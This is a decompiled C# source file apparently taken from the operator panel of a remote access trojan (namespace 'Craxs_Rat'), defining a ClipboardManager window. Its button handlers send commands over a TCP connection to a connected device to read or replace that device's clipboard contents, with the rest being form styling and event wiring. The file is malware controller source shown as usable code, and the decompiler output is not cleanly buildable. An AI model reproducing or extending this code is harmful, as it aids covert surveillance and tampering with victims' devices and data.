using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000AC RID: 172
	[DesignerGenerated]
	public partial class ClipboardManager : Form
	{
		// Token: 0x06000ADC RID: 2780 RVA: 0x0007565C File Offset: 0x0007385C
		public ClipboardManager()
		{
			base.Load += this.ClipboardManager_Load;
			this.string_0 = "null";
			this.rectangles_0 = new List<Rectangle>();
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x17000314 RID: 788
		// (get) Token: 0x06000ADF RID: 2783 RVA: 0x0000619D File Offset: 0x0000439D
		// (set) Token: 0x06000AE0 RID: 2784 RVA: 0x00075A28 File Offset: 0x00073C28
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000310 RID: 784
		// (get) Token: 0x06000AE1 RID: 2785 RVA: 0x000061A5 File Offset: 0x000043A5
		// (set) Token: 0x06000AE2 RID: 2786 RVA: 0x00075A6C File Offset: 0x00073C6C
		internal virtual Panel Panel1
		{
			[CompilerGenerated]
			get
			{
				return this._Panel1;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				Panel panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint -= value2;
				}
				this._Panel1 = value;
				panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint += value2;
				}
			}
		}

		// Token: 0x17000311 RID: 785
		// (get) Token: 0x06000AE3 RID: 2787 RVA: 0x000061AD File Offset: 0x000043AD
		// (set) Token: 0x06000AE4 RID: 2788 RVA: 0x00075AB0 File Offset: 0x00073CB0
		internal virtual Button BTN_GET
		{
			[CompilerGenerated]
			get
			{
				return this._BTN_GET;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.BTN_GET_Click);
				Button btn_GET = this._BTN_GET;
				if (btn_GET != null)
				{
					btn_GET.Click -= value2;
				}
				this._BTN_GET = value;
				btn_GET = this._BTN_GET;
				if (btn_GET != null)
				{
					btn_GET.Click += value2;
				}
			}
		}

		// Token: 0x17000312 RID: 786
		// (get) Token: 0x06000AE5 RID: 2789 RVA: 0x000061B5 File Offset: 0x000043B5
		// (set) Token: 0x06000AE6 RID: 2790 RVA: 0x00075AF4 File Offset: 0x00073CF4
		internal virtual TextBox BoxClipboard { get; set; }

		// Token: 0x17000313 RID: 787
		// (get) Token: 0x06000AE7 RID: 2791 RVA: 0x000061BD File Offset: 0x000043BD
		// (set) Token: 0x06000AE8 RID: 2792 RVA: 0x00075B08 File Offset: 0x00073D08
		internal virtual Button BTN_SET
		{
			[CompilerGenerated]
			get
			{
				return this._BTN_SET;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.BTN_SET_Click);
				Button btn_SET = this._BTN_SET;
				if (btn_SET != null)
				{
					btn_SET.Click -= value2;
				}
				this._BTN_SET = value;
				btn_SET = this._BTN_SET;
				if (btn_SET != null)
				{
					btn_SET.Click += value2;
				}
			}
		}

		// Token: 0x06000AE9 RID: 2793 RVA: 0x00075B4C File Offset: 0x00073D4C
		private void ClipboardManager_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\20.ico");
			this.method_1();
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000AEA RID: 2794 RVA: 0x00075BA4 File Offset: 0x00073DA4
		private void method_1()
		{
			try
			{
				foreach (TextBox textBox in this.Panel1.Controls.OfType<TextBox>())
				{
					textBox.ForeColor = Module5.White;
					textBox.BackColor = Module5.color_0;
					this.rectangles_0.Add(checked(new Rectangle(textBox.Location.X - 1, textBox.Location.Y - 1, textBox.Width + 1, textBox.Height + 1)));
				}
			}
			finally
			{
				IEnumerator<TextBox> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			try
			{
				foreach (Button button in this.Panel1.Controls.OfType<Button>())
				{
					button.BackColor = Module5.White;
					button.ForeColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Button> enumerator2;
				if (enumerator2 != null)
				{
					enumerator2.Dispose();
				}
			}
			try
			{
				foreach (Panel panel in base.Controls.OfType<Panel>())
				{
					panel.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Panel> enumerator3;
				if (enumerator3 != null)
				{
					enumerator3.Dispose();
				}
			}
			this.Refresh();
		}

		// Token: 0x06000AEB RID: 2795 RVA: 0x00075CFC File Offset: 0x00073EFC
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06000AEC RID: 2796 RVA: 0x00075D44 File Offset: 0x00073F44
		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			Color white = Module5.White;
			if (this.rectangles_0.Count > 0)
			{
				try
				{
					foreach (Rectangle rect in this.rectangles_0)
					{
						if (rect.Width > 0)
						{
							e.Graphics.FillRectangle(new SolidBrush(white), rect);
						}
					}
				}
				finally
				{
					List<Rectangle>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
		}

		// Token: 0x06000AED RID: 2797 RVA: 0x00075DD8 File Offset: 0x00073FD8
		private void BTN_SET_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".info",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_40,
						GClass9.string_0,
						"set",
						GClass9.string_1,
						this.BoxClipboard.Text
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000AEE RID: 2798 RVA: 0x00075EA4 File Offset: 0x000740A4
		private void BTN_GET_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".info",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_27,
						GClass9.string_0,
						"get",
						GClass9.string_1,
						"null"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x0400061F RID: 1567
		public TcpClient tcpClient_0;

		// Token: 0x04000620 RID: 1568
		public GClass8 gclass8_0;

		// Token: 0x04000621 RID: 1569
		public string string_0;

		// Token: 0x04000622 RID: 1570
		private List<Rectangle> rectangles_0;
	}
}
